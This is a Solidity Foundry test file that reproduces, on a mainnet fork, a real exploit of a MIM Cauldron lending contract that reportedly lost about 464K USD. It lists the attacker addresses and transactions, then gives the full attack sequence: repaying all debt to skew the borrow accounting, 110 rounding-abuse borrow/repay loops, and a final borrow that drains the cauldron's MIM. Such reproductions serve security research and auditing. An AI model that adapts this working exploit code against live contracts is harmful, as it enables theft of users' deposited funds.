pragma solidity ^0.8.13;



// @KeyInfo - Total Lost : ~464K USD$
// Attacker :  https://etherscan.io/address/0x87f585809ce79ae39a5fa0c7c96d0d159eb678c9
//             https://etherscan.io/address/0xbd12d6054827ae3fc6d23b1acf47736691b52fd3
//             https://etherscan.io/address/0x40d5ffa20fc0df6be4d9991938daa54e6919c714
// Attack Contract : https://etherscan.io/address/0xe1091d17473b049cccd65c54f71677da85b77a45
// Vulnerable Contract : https://etherscan.io/address/0x7259e152103756e1616a77ae982353c3751a6a90
// Attack Tx : https://etherscan.io/tx/0x26a83db7e28838dd9fee6fb7314ae58dcc6aee9a20bf224c386ff5e80f7e4cf2
//             https://etherscan.io/tx/0xdb4616b89ad82062787a4e924d520639791302476484b9a6eca5126f79b6d877

// @Analysis
// Twitter alert by Exvul : https://twitter.com/EXVULSEC/status/1752288206211690578
//                          https://twitter.com/EXVULSEC/status/1752357798783103158


import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC20.sol";

contract MIMExploitTest is Test {
  ICauldron cauldron = ICauldron(0x7259e152103756e1616A77Ae982353c3751A6a90);

  address MIM = 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3;

  address bentoBox = 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce;

  address collateral = 0x8078198Fc424986ae89Ce4a910Fc109587b6aBF3; // yvCurve-3Crypto-f

  address[] borrowers;

  uint256 constant MIM_FLASHLOAN = 5e5 ether;
  uint256 constant COL_FLASHLOAN = 100 ether;

  function setUp() public {
    vm.createSelectFork("mainnet", 19118659);

    deal(MIM, address(this), MIM_FLASHLOAN);
    deal(collateral, address(this), COL_FLASHLOAN);

    IERC20(MIM).approve(bentoBox, type(uint256).max);
    IERC20(collateral).approve(bentoBox, type(uint256).max);

    vm.label(MIM, "MIM");
    vm.label(address(cauldron), "cauldron");
    vm.label(bentoBox, "bentoBox");
    vm.label(collateral, "yvCurve-3Crypto-f");

    borrowers.push(0x9445e93057F3f5e3452Ce50fC867b22a48B4d82A);
    borrowers.push(0x7E1C8fEF68a87F7BdDf4ae644Fe4D6e6362F5fF1);
    borrowers.push(0x2f2A75279a2AC0C6b64087CE1915B1435b1d3ce2);
    borrowers.push(0x577BE3eD9A71E1c355f519BBDF5f09Ba2018b1Cc);
    borrowers.push(0xc3Be098f9594E57A3e71f485a53d990FE3961fe5);
    borrowers.push(0xe435BEbA6DEE3D6F99392ab9568777EB8165719d);
    borrowers.push(0xc0433E26E3D2Ae7D1D80E39a6D58062D1eAA54f5);
    borrowers.push(0x2c561aB0Ed33E40c70ea380BaA0dBC1ae75Ccd34);
    borrowers.push(0x33D778eD712C8C4AdD5A07baB012d1ce7bb0B4C7);
    borrowers.push(0x214BE7eBEc865c25c83DF5B343E45Aa3Bf8Df881);
    borrowers.push(0x48ED01117a130b660272228728e07eF9efe21A30);
    borrowers.push(0xD24cb02BEd630BAA49887168440D90BE8DA6708c);
    borrowers.push(0x0aB7999894F36eDe923278d4E898e78085B289e6);
    borrowers.push(0x941ec857134B13c255d6EBEeD1623b1904378De9);
    borrowers.push(0xEe64495BF9894f6c0A2Df4ac983581AADb87f62D);
    borrowers.push(0x3B473F790818976d207C2AcCdA42cb432b749451);
  }

  function test_exploit() public {
    (uint128 elastic,) = cauldron.totalBorrow();

    uint128 repayAmount = elastic - 1000 ether;

    IERC20(MIM).transfer(address(cauldron), repayAmount);

    cauldron.repayForAll(repayAmount, true);

    IBentoBox(bentoBox).deposit(MIM, address(this), bentoBox, IERC20(MIM).balanceOf(address(this)), 0);

    for (uint256 i = 0; i < borrowers.length; ++i) {
      uint256 borrowAmount = cauldron.userBorrowPart(borrowers[i]);

      if (i == borrowers.length - 1) {
        borrowAmount -= 1;
      }
      cauldron.repay(borrowers[i], true, borrowAmount);
    }

    IBentoBox(bentoBox).deposit(collateral, address(this), address(cauldron), 50 ether, 0);

    cauldron.addCollateral(address(this), true, 10);

    cauldron.borrow(address(this), 1);
    for (uint256 i = 0; i < 110; ++i) {
      cauldron.borrow(address(this), 1);
      cauldron.repay(address(this), true, 1);
    }
    cauldron.repay(address(this), true, 1);

    cauldron.totalBorrow();

    address anotherAddr = vm.addr(123);
    vm.startPrank(anotherAddr);
    cauldron.addCollateral(anotherAddr, true, 1 ether);
    cauldron.borrow(anotherAddr, IBentoBox(bentoBox).balanceOf(MIM, address(cauldron)));

    IBentoBox(bentoBox).withdraw(
      MIM, anotherAddr, anotherAddr, IBentoBox(bentoBox).balanceOf(MIM, address(anotherAddr)), 0
    );

    // cauldron drained
    assertEq(IBentoBox(bentoBox).balanceOf(MIM, address(cauldron)), 0);
  }
}

interface ICauldron {
  function addCollateral(address to, bool skim, uint256 share) external;

  function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);

  function repay(address to, bool skim, uint256 part) external returns (uint256 amount);

  function repayForAll(uint128 amount, bool skim) external returns (uint128);

  function totalBorrow() external view returns (uint128 elastic, uint128 base);

  function userBorrowPart(address) external view returns (uint256);

  function totalCollateralShare() external view returns (uint256);
}

interface IBentoBox {
  function deposit(address token_, address from, address to, uint256 amount, uint256 share)
    external
    payable
    returns (uint256 amountOut, uint256 shareOut);

  function withdraw(address token_, address from, address to, uint256 amount, uint256 share)
    external
    returns (uint256 amountOut, uint256 shareOut);

  function toAmount(address token, uint256 share, bool roundUp) external view returns (uint256 amount);

  function toShare(address token, uint256 amount, bool roundUp) external view returns (uint256 share);

  function balanceOf(address, address) external view returns (uint256);
}
